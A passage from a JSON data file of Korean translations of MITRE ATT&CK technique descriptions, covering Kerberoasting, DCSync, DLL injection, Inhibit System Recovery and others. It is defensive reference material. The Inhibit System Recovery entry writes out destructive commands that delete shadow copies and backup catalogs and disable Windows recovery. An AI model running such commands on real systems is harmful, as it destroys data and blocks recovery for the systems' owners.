    "description": "적대자는 주요 통신 채널이 손상되거나 접근할 수 없게 될 경우, 신뢰할 수 있는 명령 및 통제를 유지하고 데이터 전송 한계를 피하기 위해 대체 통신 채널을 사용할 수 있습니다.",
    "external_id": "T1008",
    "modified": "2020-07-14T19:49:47.340Z",
    "translated": true
  },
  {
    "title": "NTFS File Attributes",
    "description": "적대세력은 탐지를 피하기 위해 NTFS 파일 속성을 사용하여 악성 데이터를 숨길 수 있습니다. 모든 New Technology File System (NTFS) 형식의 파티션은 파티션의 모든 파일/디렉토리에 대한 기록을 유지하는 마스터 파일 테이블(MFT)을 포함합니다. MFT 항목 내에는 확장 속성(EA) 및 데이터(여러 데이터 속성이 존재할 때 대체 데이터 스트림(ADS)으로 알려짐)와 같은 파일 속성이 있어 임의의 데이터(심지어 전체 파일)를 저장하는 데 사용할 수 있습니다.\n\n적대세력은 파일에 직접 저장하는 대신 파일 속성 메타데이터에 악성 데이터 또는 바이너리를 저장할 수 있습니다. 이는 정적 지표 스캐닝 도구 및 안티바이러스와 같은 일부 방어 수단을 피하기 위해 수행될 수 있습니다.",
    "external_id": "T1564.004",
    "modified": "2024-09-12T15:27:29.615Z",
    "translated": true
  },
  {
    "title": "Kerberoasting",
    "description": "적대자는 유효한 Kerberos 티켓 발급 티켓(TGT)을 악용하거나 네트워크 트래픽을 스니핑하여 서비스 티켓 제공 서비스(TGS) 티켓을 얻을 수 있으며, 이 티켓은 무차별 대입 공격에 취약할 수 있습니다.\n\n서비스 주체 이름(SPN)은 각 Windows 서비스 인스턴스를 고유하게 식별하는 데 사용됩니다. 인증을 가능하게 하려면 Kerberos는 SPN이 적어도 하나의 서비스 로그온 계정(서비스를 실행하는 전용 계정)과 연결되어 있어야 합니다.\n\n유효한 Kerberos 티켓 발급 티켓(TGT)을 보유한 적대자는 도메인 컨트롤러(DC)에서 모든 SPN에 대한 하나 이상의 Kerberos 서비스 티켓(TGS)을 요청할 수 있습니다. 이러한 티켓의 일부는 RC4 알고리즘으로 암호화될 수 있으며, 이는 해당 SPN과 연관된 서비스 계정의 Kerberos 5 TGS-REP etype 23 해시가 개인 키로 사용되어 오프라인 무차별 대입 공격에 취약해질 수 있으며, 이로 인해 평문 자격 증명이 노출될 수 있습니다.\n\n이와 동일한 행동은 네트워크 트래픽에서 캡처한 서비스 티켓을 사용하여 실행될 수 있습니다.\n\n해킹된 해시는 유효한 계정에 대한 접근을 통해 지속성, 권한 상승 및 수평 이동을 가능하게 할 수 있습니다.",
    "external_id": "T1558.003",
    "modified": "2024-09-23T22:20:10.994Z",
    "translated": true
  },
  {
    "title": "DCSync",
    "description": "적대자들은 DCSync라는 기술을 사용하여 원격 도메인 컨트롤러에서 복제 프로세스를 시뮬레이션할 때 Windows 도메인 컨트롤러의 응용 프로그램 프로그래밍 인터페이스(API)를 악용하여 자격 증명 및 기타 민감한 정보에 접근하려고 할 수 있습니다.\n\n관리자, 도메인 관리자 및 엔터프라이즈 관리자 그룹의 구성원이나 도메인 컨트롤러에서 컴퓨터 계정은 DCSync를 실행하여 Active Directory에서 비밀번호 데이터를 가져올 수 있으며, 여기에는 KRBTGT 및 Administrators와 같은 잠재적으로 유용한 계정의 현재 및 과거 해시가 포함될 수 있습니다. 이러한 해시는 나중에 패스 더 티켓(Pass the Ticket)에 사용하기 위한 '골든 티켓(Golden Ticket)'을 생성하거나 계정의 비밀번호를 변경하는 데 사용될 수 있습니다.\n\nDCSync 기능은 Mimikatz의 \"lsadump\" 모듈에 포함되어 있으며, Lsadump는 레거시 복제 프로토콜을 통해 DCSync를 수행하는 NetSync도 포함하고 있습니다.",
    "external_id": "T1003.006",
    "modified": "2024-10-15T15:54:08.312Z",
    "translated": true
  },
  {
    "title": "System Time Discovery",
    "description": "적대자는 로컬 또는 원격 시스템에서 시스템 시간 및/또는 시간대 설정을 수집할 수 있습니다. 시스템 시간은 윈도우의 Windows Time Service 또는 macOS의 시스템 설정 도구와 같은 서비스에 의해 설정되고 저장됩니다. 이러한 시간 설정은 또한 기업 네트워크 내의 시스템과 서비스 간에 동기화될 수 있으며, 보통 도메인 내의 네트워크 시간 서버를 통해 이루어집니다.\n\n시스템 시간 정보를 수집하는 방법은 여러 가지가 있으며, 예를 들어 윈도우에서는 `net time \\\\hostname` 명령을 수행하여 원격 시스템의 시스템 시간을 수집할 수 있습니다. 피해자의 시간대는 현재 시스템 시간으로 유추할 수 있으며, `w32tm /tz` 명령을 사용하여 수집할 수도 있습니다. 또한, 적대자는 `GetTickCount()`와 같은 함수를 사용하여 시스템이 부팅된 이후 얼마나 지났는지를 확인함으로써 장치의 가동 시간을 파악할 수 있습니다.\n\n네트워크 장치에서는 `show clock detail` 명령과 같은 네트워크 장치 CLI 명령을 사용하여 현재 시간 설정을 확인할 수 있습니다.\n\n또한, 시스템 호출(예: `time()`)을 사용하여 리눅스 장치에서 현재 시간을 수집하는 방법도 있습니다. macOS 시스템에서는 `systemsetup -gettimezone` 또는 `timeIntervalSinceNow`와 같은 명령을 사용하여 현재 시간대 정보나 현재 날짜 및 시간을 수집할 수 있습니다.\n\n이 정보는 파일을 예약된 작업으로 실행하는 것과 같은 다른 기술을 수행하는 데 유용할 수 있으며, 시간대에 따라 지역 정보를 발견하여 피해자를 대상으로 하는 데 도움을 줄 수 있습니다. 적대자는 시스템 시간에 대한 지식을 시간 폭탄의 일부로 사용하거나 특정 날짜/시간까지 실행을 지연시킬 수 있습니다.",
    "external_id": "T1124",
    "modified": "2024-04-16T12:50:15.929Z",
    "translated": true
  },
  {
    "title": "At",
    "description": "적대자는 초기 또는 반복적으로 악성 코드를 실행하기 위해 `at` 유틸리티를 악용할 수 있습니다. `at` 유틸리티는 특정 시간과 날짜에 작업을 예약하기 위해 Windows, Linux 및 macOS 내에서 실행 파일로 존재합니다. Windows 환경에서는 `Scheduled Task`의 `schtasks`에 대한 대체로 사용 중단되었지만, `at`을 사용하려면 작업 예약 서비스가 실행 중이어야 하고 사용자가 로컬 관리자 그룹의 구성원으로 로그인되어 있어야 합니다. 적대자는 `at` 명령어를 명시적으로 실행하는 것 외에도 Windows 관리 도구 `Win32_ScheduledJob` WMI 클래스를 직접 활용하여 `at`으로 작업을 예약할 수도 있습니다.\n\nLinux 및 macOS에서는 `at`이 슈퍼유저뿐 아니라 `at.allow` 파일에 추가된 사용자에 의해 호출될 수 있습니다. `at.allow` 파일이 존재하지 않으면 `at.deny` 파일이 확인됩니다. `at.deny`에 나열되지 않은 모든 사용자 이름은 `at`를 호출할 수 있습니다. `at.deny`가 존재하고 비어 있다면, 전 세계적으로 `at`의 사용이 허용됩니다. 두 파일이 모두 존재하지 않는 경우(종종 기본 설정), 오직 슈퍼유저만 `at`를 사용할 수 있습니다.\n\n적대자는 `at`을 사용하여 시스템 시작 시 또는 정기적으로 프로그램을 실행시켜 지속성을 유지할 수 있습니다. `at`은 또한 원격 실행을 수행하거나 특정 계정의 맥락 내에서 프로세스를 실행하는 데 악용될 수 있습니다.\n\nLinux 환경에서는 적대자가 제한된 환경을 탈피하기 위해 작업을 사용하여 대화형 시스템 셸을 생성하거나 시스템 명령을 실행하는 데 `at`을 악용할 수 있습니다. 유사하게, `at`은 바이너리가 `sudo`를 통해 슈퍼유저로 실행되도록 허용되는 경우 권한 상승에 사용될 수 있습니다.",
    "external_id": "T1053.002",
    "modified": "2024-10-12T15:53:12.333Z",
    "translated": true
  },
  {
    "title": "Dynamic-link Library Injection",
    "description": "적대자는 프로세스 기반 방어를 회피하고 권한을 상승시킬 가능성을 위해 프로세스에 동적 링크 라이브러리(DLL)를 주입할 수 있습니다. DLL 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다. \n\nDLL 주입은 일반적으로 대상 프로세스의 가상 주소 공간에 DLL의 경로를 기록한 다음 새로운 스레드를 호출하여 DLL을 로드하여 수행됩니다. 이 기록은 원주율 Windows API 호출을 통해 수행될 수 있으며, 그 후 <code>CreateRemoteThread</code>를 사용하여 호출됩니다(이 호출은 DLL 로드를 담당하는 <code>LoadLibrary</code> API를 호출합니다).\n\n이 방법의 변형으로는 반사 DLL 주입(자기 매핑 DLL을 프로세스에 쓰는 방법) 및 메모리 모듈(프로세스에 쓰는 동안 DLL을 매핑하는 방법)이 있으며, 이러한 방법은 주소 재배치 문제와 실행을 호출하는 추가 API를 해결합니다(이 방법들은 <code>LoadLibrary</code>의 기능을 수동으로 수행하여 파일을 메모리에서 로드하고 실행하기 때문입니다).\n\n또한 이러한 방법의 다른 변형으로는 모듈 스톰핑/오버로드 또는 DLL 할로잉이라고도 불리는 방법이 있습니다. 이 방법은 원격 프로세스에 신뢰할 수 있는 DLL을 로드한 다음, 대상 프로세스에서 새로운 스레드를 시작하기 전에 모듈의 <code>AddressOfEntryPoint</code>를 수동으로 덮어쓰는 것을 포함합니다. 이 변형은 공격자가 디스크에 있는 신뢰할 수 있는 DLL 파일에 의해 악의적인 주입 코드를 숨길 수 있도록 합니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 프로세스의 메모리, 시스템/네트워크 리소스에 대한 접근을 허용하며, 권한 상승이 가능할 수도 있습니다. DLL 주입을 통한 실행은 실행이 정당한 프로세스 아래에 숨겨지기 때문에 보안 제품의 탐지를 피할 수 있습니다.",
    "external_id": "T1055.001",
    "modified": "2023-08-11T21:34:38.558Z",
    "translated": true
  },
  {
    "title": "Exploits",
    "description": "적대자는 목표를 설정하는 동안 사용할 수 있는 익스플로잇을 구매, 훔치거나 다운로드할 수 있습니다. 익스플로잇은 컴퓨터 하드웨어나 소프트웨어에서 의도하지 않거나 예상치 못한 행동을 발생시키기 위해 버그나 취약점을 이용합니다. 적대자는 자신만의 익스플로잇을 개발하기보다는 온라인에서 익스플로잇을 찾거나 수정하거나, 익스플로잇 공급업체로부터 구매할 수 있습니다.\n\n인터넷에서 무료 익스플로잇을 다운로드하는 것 외에도, 적대자는 제3자 엔티티로부터 익스플로잇을 구매할 수 있습니다. 제3자 엔티티는 익스플로잇 개발을 전문으로 하는 기술 회사, 범죄 시장(익스플로잇 키트를 포함) 또는 개인 등을 포함할 수 있습니다. 익스플로잇을 구매하는 것 외에, 적대자는 제3자 엔티티(다른 적대자를 포함)로부터 익스플로잇을 훔치고 재사용할 수 있습니다.\n\n적대자는 익스플로잇 공급자 포럼을 모니터링하여 기존의 익스플로잇 상태와 새로 발견된 익스플로잇을 이해할 수 있습니다. 익스플로잇이 발견되고 공개되는 사이에는 보통 지연이 발생합니다. 적대자는 익스플로잇 연구 및 개발을 수행하는 것으로 알려진 시스템을 목표로 하여 해당 지식을 subsequent 작업에 사용하기 위해 얻을 수 있습니다.\n\n적대자는 다양한 적대자 생애주기 단계에서 익스플로잇을 사용할 수 있습니다.",
    "external_id": "T1588.005",
    "modified": "2021-04-15T03:14:01.255Z",
    "translated": true
  },
  {
    "title": "Modify Authentication Process",
    "description": "적대자는 인증 메커니즘과 프로세스를 수정하여 사용자 자격 증명에 접근하거나 불법적인 계정 접근을 가능하게 할 수 있습니다. 인증 프로세스는 Windows의 로컬 보안 인증 서버(LSASS) 프로세스 및 보안 계정 관리자(SAM), Unix 기반 시스템의 플러그형 인증 모듈(PAM), MacOS 시스템의 권한 플러그인과 같은 메커니즘에 의해 처리되며, 자격 증명을 수집, 저장 및 검증하는 역할을 합니다. 인증 프로세스를 수정함으로써 적대자는 유효한 계정을 사용하지 않고도 서비스나 시스템에 인증할 수 있을 가능성이 있습니다.\n\n적대자는 이 프로세스의 일부를 악의적으로 수정하여 자격 증명을 드러내거나 인증 메커니즘을 우회할 수 있습니다. 손상된 자격 증명이나 접근 권한은 네트워크 내 시스템의 다양한 리소스에 설정된 접근 제어를 우회하는 데 사용될 수 있으며, VPN, Outlook 웹 액세스 및 원격 데스크톱과 같은 외부 서비스 및 원격 시스템에 대한 지속적인 접근을 위해 사용될 수도 있습니다.",
    "external_id": "T1556",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Credential API Hooking",
    "description": "적대자는 사용자 자격 증명을 수집하기 위해 Windows 응용 프로그램 프로그래밍 인터페이스(API) 기능에 후킹할 수 있습니다. 악의적인 후킹 메커니즘은 사용자 인증 자격 증명을 드러내는 매개변수를 포함한 API 호출을 캡처할 수 있습니다. 이 기술은 사용자 자격 증명을 드러내는 매개변수를 포함한 API 기능에 특별히 집중합니다. 후킹은 이러한 기능에 대한 호출을 리디렉션하는 것을 포함하며, 다음과 같은 방식으로 구현될 수 있습니다:\n\n* **후크 프로시저**: 메시지, 키 입력 및 마우스 입력과 같은 이벤트에 응답하여 지정된 코드를 가로채고 실행합니다.\n* **수입 주소 테이블(IAT) 후킹**: 프로세스의 IAT를 수정하여 수입된 API 기능에 대한 포인터를 저장합니다.\n* **인라인 후킹**: API 기능의 첫 번째 바이트를 덮어써서 코드 흐름을 리디렉션합니다.",
    "external_id": "T1056.004",
    "modified": "2024-08-27T21:03:56.385Z",
    "translated": true
  },
  {
    "title": "Firmware Corruption",
    "description": "적대적인 공격자는 시스템에 연결된 장치의 시스템 BIOS 또는 기타 펌웨어의 플래시 메모리 내용을 덮어쓰거나 손상시켜 장치가 작동하지 않거나 부팅할 수 없게 만들어 장치 및/또는 시스템의 사용 가능성을 차단할 수 있습니다. 펌웨어는 하드웨어 장치의 비휘발성 메모리에서 로드되고 실행되는 소프트웨어로, 장치 기능을 초기화하고 관리하는 역할을 합니다. 이러한 장치에는 마더보드, 하드 드라이브 또는 비디오 카드가 포함될 수 있습니다.\n\n일반적으로 적대적인 공격자는 시스템이나 장치의 사용을 차단하기 위해 펌웨어를 조작, 덮어쓰거나 손상시킬 수 있습니다. 예를 들어, 네트워크 장치의 운영 체제를 로드하는 데 책임이 있는 펌웨어의 손상은 네트워크 장치를 작동 불능 상태로 만들 수 있습니다. 장치에 따라 이 공격은 데이터 파괴로 이어질 수도 있습니다.",
    "external_id": "T1495",
    "modified": "2022-08-31T17:30:05.440Z",
    "translated": true
  },
  {
    "title": "Inhibit System Recovery",
    "description": "대적자는 복구를 방해하기 위해 시스템 복구를 돕기 위해 설계된 내장 데이터를 삭제하거나 제거하고 서비스를 종료할 수 있습니다. 이는 사용 가능한 백업 및 복구 옵션에 대한 접근을 막을 수 있습니다.\n\n운영 체제에는 백업 카탈로그, 볼륨 섀도 복사, 자동 복구 기능 등 손상된 시스템을 수정하는 데 도움이 되는 기능이 포함될 수 있습니다. 대적자는 데이터 파괴와 영향을 위한 데이터 암호화의 효과를 증대시키기 위해 시스템 복구 기능을 비활성화하거나 삭제할 수 있습니다. 또한 대적자는 복구 알림을 비활성화한 후 백업을 손상시킬 수 있습니다.\n\n대적자가 시스템 복구 기능을 비활성화하거나 삭제하는 데 사용한 여러 가지 기본 Windows 유틸리티가 있습니다:\n\n* `vssadmin.exe`는 시스템의 모든 볼륨 섀도 복사를 삭제하는 데 사용할 수 있습니다 - `vssadmin.exe delete shadows /all /quiet`\n* Windows 관리 도구는 볼륨 섀도 복사를 삭제하는 데 사용할 수 있습니다 - `wmic shadowcopy delete`\n* `wbadmin.exe`는 Windows 백업 카탈로그를 삭제하는 데 사용할 수 있습니다 - `wbadmin.exe delete catalog -quiet`\n* `bcdedit.exe`는 부팅 구성 데이터를 수정하여 자동 Windows 복구 기능을 비활성화하는 데 사용할 수 있습니다 - `bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no`\n* `REAgentC.exe`는 감염된 시스템의 Windows 복구 환경(WINRE) 복구 옵션을 비활성화하는 데 사용할 수 있습니다.\n* `diskshadow.exe`는 시스템의 모든 볼륨 섀도 복사를 삭제하는 데 사용할 수 있습니다 - `diskshadow delete shadows all`\n\n네트워크 장치에서는 대적자가 백업 펌웨어 이미지를 삭제하고 파일 시스템을 포맷하기 위해 디스크 와이프를 활용한 후, 시스템 종료/재부팅을 통해 장치를 다시 로드할 수 있습니다. 이러한 활동은 네트워크 장치를 완전히 작동 불능 상태로 만들고 복구 작업을 방해할 수 있습니다.\n\n대적자는 네트워크에 연결된 \"온라인\" 백업을 삭제할 수도 있습니다. 이는 네트워크 저장 매체를 통해 이루어지거나 클라우드 서비스와 동기화되는 폴더를 통해 이루어질 수 있습니다. 클라우드 환경에서는 대적자가 버전 관리 및 백업 정책을 비활성화하고 스냅샷, 데이터베이스 백업, 머신 이미지 및 재해 복구 시나리오에서 사용되도록 설계된 객체의 이전 버전을 삭제할 수 있습니다.",
    "external_id": "T1490",
    "modified": "2024-09-24T13:27:31.881Z",
    "translated": true
  },
  {
    "title": "Netsh Helper DLL",
    "description": "위협 세력은 Netsh Helper DLL에 의해 실행되는 악성 콘텐츠를 통해 지속성을 확립할 수 있습니다. Netsh.exe(또는 Netshell이라고도 함)는 시스템의 네트워크 구성과 상호 작용하기 위해 사용되는 명령줄 스크립팅 유틸리티입니다. 이 유틸리티의 기능을 확장하기 위해 도우미 DLL을 추가하는 기능을 포함하고 있습니다. 등록된 netsh.exe 도우미 DLL의 경로는 Windows 레지스트리에 <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>에 입력됩니다.\n\n위협 세력은 netsh.exe 도우미 DLL을 사용하여 임의의 코드를 지속적으로 실행할 수 있습니다. 이 실행은 netsh.exe가 실행될 때마다 발생하며, 이는 자동으로 다른 지속성 기술과 함께 발생할 수 있거나 시스템에 있는 다른 소프트웨어(VPN 등)가 정상 기능의 일환으로 netsh.exe를 실행할 경우 발생할 수 있습니다.",
    "external_id": "T1546.007",
    "modified": "2022-04-20T17:09:17.363Z",
    "translated": true
  },
  {
    "title": "Spearphishing via Service",
    "description": "적대자는 희생자 시스템에 접근하기 위해 제3자 서비스를 통해 스피어피싱 메시지를 보낼 수 있습니다. 서비스 기반 스피어피싱은 스피어피싱의 특정 변형입니다. 이는 다른 형태의 스피어피싱과는 달리 기업 이메일 채널을 직접 사용하는 것이 아니라 제3자 서비스를 이용한다는 점에서 차별화됩니다.\n\n모든 형태의 스피어피싱은 특정 개인, 기업 또는 산업을 겨냥한 전자적으로 전달되는 사회 공학 기법입니다. 이 경우 적대자는 다양한 소셜 미디어 서비스, 개인 웹 메일 및 기타 비기업 통제 서비스 등을 통해 메시지를 보냅니다. 이러한 서비스는 기업보다 보안 정책이 덜 엄격할 가능성이 큽니다. 대부분의 스피어피싱과 마찬가지로 목표는 대상을 유도하거나 관심을 끌기 위한 것입니다. 적대자는 가짜 소셜 미디어 계정을 만들어 직원들에게 잠재적인 일자리 기회를 제안합니다. 이를 통해 환경에서 돌아가는 서비스, 정책 및 소프트웨어에 대해 질문할 수 있는 그럴듯한 이유를 제공할 수 있습니다. 적대자는 이러한 서비스를 통해 악성 링크나 첨부 파일을 보낼 수 있습니다.\n\n일반적인 예로는 소셜 미디어를 통해 대상과 신뢰를 쌓고, 그 대상이 업무용 컴퓨터에서 사용하는 개인 웹 메일 서비스로 콘텐츠를 보내는 방법이 있습니다. 이렇게 하면 적대자가 업무 계정에서 일부 이메일 제한을 우회할 수 있으며, 대상이 예상한 파일이므로 더 쉽게 열어볼 가능성이 높아집니다. 만약 페이로드가 예상대로 작동하지 않으면, 적대자는 정상적인 커뮤니케이션을 계속하며 대상에게 어떻게 작동하는지에 대해 문제를 해결할 수 있습니다.",
    "external_id": "T1566.003",
    "modified": "2024-10-15T15:16:30.272Z",
    "translated": true
  },
  {
    "title": "Internal Proxy",
    "description": "적대자들은 손상된 환경에서 두 개 이상의 시스템 간에 명령 및 제어 트래픽을 유도하기 위해 내부 프록시를 사용할 수 있습니다. 많은 도구가 프록시를 통한 트래픽 리디렉션이나 포트 리디렉션을 가능하게 합니다. 적대자들은 손상된 환경 내에서 명령 및 제어 통신을 관리하기 위해 내부 프록시를 사용하며, 동시에 여러 개의 아웃바운드 네트워크 연결 수를 줄이고, 연결 손실에 대비한 탄력성을 제공하며, 감시를 피하기 위해 감염된 시스템 간의 기존 신뢰된 통신 경로를 활용할 수 있습니다. 내부 프록시 연결은 환경에 잘 어울리도록 SMB와 같은 일반적인 피어 투 피어(p2p) 네트워킹 프로토콜을 사용할 수 있습니다.\n\n손상된 내부 시스템을 프록시로 사용함으로써 적대자들은 C2 트래픽의 진정한 목적지를 숨기면서 외부 시스템에 대한 수많은 연결 필요성을 줄일 수 있습니다.",
    "external_id": "T1090.001",
    "modified": "2024-03-07T14:29:02.408Z",
    "translated": true
  },
  {
    "title": "System Script Proxy Execution",
    "description": "적대자는 인증서로 서명된 신뢰할 수 있는 스크립트를 사용하여 악성 파일의 실행을 우회할 수 있습니다. Microsoft에서 다운로드되었거나 Windows 설치의 기본값으로 제공되는 여러 Microsoft 서명 스크립트는 다른 파일의 실행을 중계하는 데 사용될 수 있습니다. 이러한 동작은 적대자에 의해 악성 파일을 실행하는 데 악용될 수 있으며, 이는 시스템에서 애플리케이션 제어 및 서명 유효성 검사를 우회할 수 있습니다.",
    "external_id": "T1216",
    "modified": "2022-04-18T14:43:46.045Z",
    "translated": true
  },
  {
    "title": "Dead Drop Resolver",
    "description": "적대자는 기존의 합법적인 외부 웹 서비스를 사용하여 추가적인 명령 및 제어(C2) 인프라를 가리키는 정보를 호스트할 수 있습니다. 적대자는 웹 서비스에 내장된(종종 난독화/인코딩된) 도메인이나 IP 주소를 포함하는 콘텐츠를 게시할 수 있습니다. 감염된 피해자는 이러한 결정 위치로 연락하고 리디렉션됩니다.\n\nC2의 메커니즘 역할을 하는 인기 웹사이트와 소셜 미디어는 네트워크 내 호스트가 이미 해킹되기 전에 이들과 통신하고 있을 가능성 때문에 상당한 은폐 효과를 줄 수 있습니다. Google이나 Twitter와 같은 일반적인 서비스를 사용하면 적대자가 예상되는 잡음 속에 숨어들기 쉬워집니다. 웹 서비스 제공자는 일반적으로 SSL/TLS 암호화를 사용하므로 적대자에게 추가적인 보호 수준을 제공합니다.\n\n결정 위치 사용은 악성코드 이진 분석을 통해 백엔드 C2 인프라의 발견을 보호하면서도 운영의 회복력을 높일 수 있습니다(이 인프라는 동적으로 변경될 수 있습니다).",
    "external_id": "T1102.001",
    "modified": "2020-03-26T23:12:30.499Z",
    "translated": true
  },
  {
    "title": "Junk Data",
    "description": "적대 세력은 탐지를 더 어렵게 만들기 위해 명령 및 제어에 사용되는 프로토콜에 쓰레기 데이터를 추가할 수 있다. 적대 세력은 명령 및 제어에 사용되는 프로토콜에 무작위 또는 무의미한 데이터를 추가함으로써 트래픽을 해독하거나 분석하는 간단한 방법을 방지할 수 있다. 예를 들어, 중요 문자의 앞이나 뒤에 쓰레기 문자를 추가하거나 중요한 문자 사이에 쓰레기 문자를 삽입하는 방법이 있다.",
    "external_id": "T1001.001",
    "modified": "2024-02-02T20:10:01.862Z",
    "translated": true
  },
  {
    "title": "Spearphishing Service",
    "description": "적대자는 제3자 서비스를 통해 스피어피싱 메시지를 보내어 목표로 하는 정보를 유출하도록 유도할 수 있습니다. 정보를 위한 스피어피싱은 목표를 속여 종종 자격 증명이나 기타 실행 가능한 정보를 공개하게 하려는 시도입니다. 정보를 위한 스피어피싱은 종종 정보를 수집할 이유가 있는 출처로 가장하는 것과 같은 사회 공학 기술을 포함하며, 여러 개의 긴급한 메시지를 보내기도 합니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 대상으로 한 전자적으로 전달되는 사회 공학입니다. 이 경우 적대자는 다양한 소셜 미디어 서비스, 개인 웹메일 및 기타 기업 통제 서비스가 아닌 경로를 통해 메시지를 보냅니다. 이러한 서비스는 기업보다 보안 정책이 덜 엄격할 가능성이 높습니다. 대부분의 스피어피싱과 마찬가지로, 목표와의 친밀감을 형성하거나 방식으로 목표의 관심을 끄는 것이 목표입니다. 적대자는 가짜 소셜 미디어 계정을 만들고 직원에게 잠재적인 취업 기회에 대해 메시지를 보낼 수 있습니다. 이렇게 하면 서비스, 정책, 환경에 대한 정보를 묻는 그럴듯한 이유를 제공할 수 있습니다. 적대자는 이전에 조사한 정보(예: 소셜 미디어나 피해자 소유 웹사이트 검색)를 사용하여 설득력 있고 믿을 만한 유인책을 설계할 수도 있습니다.",
    "external_id": "T1598.001",
    "modified": "2021-04-15T03:43:12.843Z",
    "translated": true
  },
  {
    "title": "Container API",
    "description": "적대자는 컨테이너 환경 내의 API를 통해 자격 증명을 수집할 수 있습니다. 이러한 환경의 API는 사용자가 컨테이너 리소스와 클러스터 구성 요소를 원격으로 관리할 수 있도록 합니다.\n\n적대자는 Docker API에 접근하여 클라우드, 컨테이너 및 환경 내의 다양한 리소스에 대한 자격 증명이 포함된 로그를 수집할 수 있습니다. 충분한 권한이 있는 적대자는 포드의 서비스 계정을 통해 Kubernetes API를 사용하여 Kubernetes API 서버에서 자격 증명을 검색할 수 있습니다. 이러한 자격 증명에는 Docker API 인증에 필요한 것들이나 Kubernetes 클러스터 구성 요소에서의 비밀이 포함될 수 있습니다.",
    "external_id": "T1552.007",
    "modified": "2024-10-15T16:25:28.820Z",
    "translated": true
  },
  {
    "title": "SQL Stored Procedures",
    "description": "적대자는 SQL 저장 프로시저를 악용하여 시스템에 지속적으로 접근할 수 있는 방법을 구축할 수 있습니다. SQL 저장 프로시저는 데이터베이스 사용자가 자주 사용하는 SQL 쿼리를 다시 작성하는 데 시간을 낭비하지 않도록 저장하고 재사용할 수 있는 코드입니다. 저장 프로시저는 프로시저 이름을 사용하여 데이터베이스에 SQL 문을 통해 호출하거나 정의된 이벤트(예: SQL 서버 응용 프로그램이 시작되거나 재시작될 때)를 통해 호출할 수 있습니다.\n\n적대자는 SQL 데이터베이스 서버에서 지속성 메커니즘을 제공할 수 있는 악성 저장 프로시저를 만들 수 있습니다. SQL 구문을 통해 운영 체제 명령을 실행하기 위해 적대자는 MSSQL 서버의 xp_cmdshell과 같은 추가 기능을 활성화해야 할 수 있습니다.\n\nMicrosoft SQL Server는 공통 언어 런타임(CLR) 통합을 활성화할 수 있습니다. CLR 통합이 활성화되면 응용 프로그램 개발자는 .NET 프레임워크 언어(예: VB .NET, C# 등)를 사용하여 저장 프로시저를 작성할 수 있습니다. 적대자는 저장 프로시저에 연결된 CLR 어셈블리를 만들거나 수정할 수 있으며, 이러한 CLR 어셈블리는 임의의 명령을 실행하도록 구성될 수 있습니다.",
    "external_id": "T1505.001",
    "modified": "2024-10-15T16:05:24.007Z",
    "translated": true
  },
  {
    "title": "Network Device Authentication",
    "description": "적대자는 패치 시스템 이미지를 사용하여 운영 체제에 암호를 하드코딩할 수 있으며, 이를 통해 네트워크 장치의 로컬 계정에 대한 기본 인증 메커니즘을 우회할 수 있습니다.\n\n시스템 이미지를 수정하는 것은 네트워크 장치의 운영 체제에 임베디드 코드를 포함하여 특정 암호를 사용하는 적대자에게 접근을 제공할 수 있습니다. 수정된 내용에는 패치를 통해 운영 체제 이미지에 삽입된 특정 암호가 포함됩니다. 인증 시도 시, 삽입된 코드는 먼저 사용자가 입력한 값이 암호인지 확인합니다. 맞다면 접근이 허용됩니다. 그렇지 않으면 임베디드 코드는 잠재적으로 유효한 자격 증명 확인을 위해 자격 증명을 전달합니다.",
    "external_id": "T1556.004",
    "modified": "2021-12-14T23:14:26.107Z",
    "translated": true
  },
  {
    "title": "Disk Content Wipe",
    "description": "공격자는 특정 시스템이나 네트워크 내에서 대량으로 저장 장치의 내용을 삭제하여 시스템 및 네트워크 리소스의 가용성을 중단시킬 수 있습니다.\n\n공격자는 저장 장치의 내용을 부분적으로 또는 완전히 덮어써서 데이터를 저장 인터페이스를 통해 복구할 수 없도록 만들 수 있습니다. 특정 디스크 구조나 파일을 삭제하는 대신, 파괴적인 의도를 가진 공격자는 임의의 디스크 콘텐츠 부분을 삭제할 수 있습니다. 디스크 내용을 삭제하기 위해 공격자는 하드 드라이브에 직접 액세스하여 임의 크기의 디스크 부분을 무작위 데이터로 덮어쓸 수 있습니다. 공격자는 또한 제3자 드라이버를 이용하여 디스크 내용에 직접 접근하는 방식이 관찰되었습니다. 이러한 행동은 개별 파일 대신 디스크의 섹션이 삭제되기 때문에 데이터 파괴와는 구별됩니다.\n\n네트워크 전체의 가용성 중단이 목표인 작전에서 목표 조직에 대한 영향을 극대화하기 위해, 디스크 내용 삭제에 사용되는 악성 소프트웨어는 [확산 방법]과 같은 웜 유사 기능을 가질 수 있으며, 추가 기술을 활용하여 네트워크를 통해 퍼질 수 있습니다.",
    "external_id": "T1561.001",
    "modified": "2024-04-16T13:00:33.303Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Unencrypted Non-C2 Protocol",
    "description": "적대 세력은 기존의 명령 및 제어 채널 외의 암호화되지 않은 네트워크 프로토콜을 통해 데이터를 유출함으로써 데이터를 도용할 수 있습니다. 데이터는 또한 주요 명령 및 제어 서버에서 다른 네트워크 위치로 전송될 수 있습니다.\n\n적대 세력은 네트워크 프로토콜 내에서 암호화 없이 데이터를 혼란스럽게 하는 방법을 선택할 수 있습니다. 이는 사용자 정의 또는 공개적으로 사용 가능한 인코딩/압축 알고리즘을 포함할 수 있으며, 프로토콜 헤더와 필드 내에 데이터를 포함하는 것도 포함됩니다.",
    "external_id": "T1048.003",
    "modified": "2023-04-12T23:39:25.476Z",
    "translated": true
  },
  {
    "title": "Dylib Hijacking",
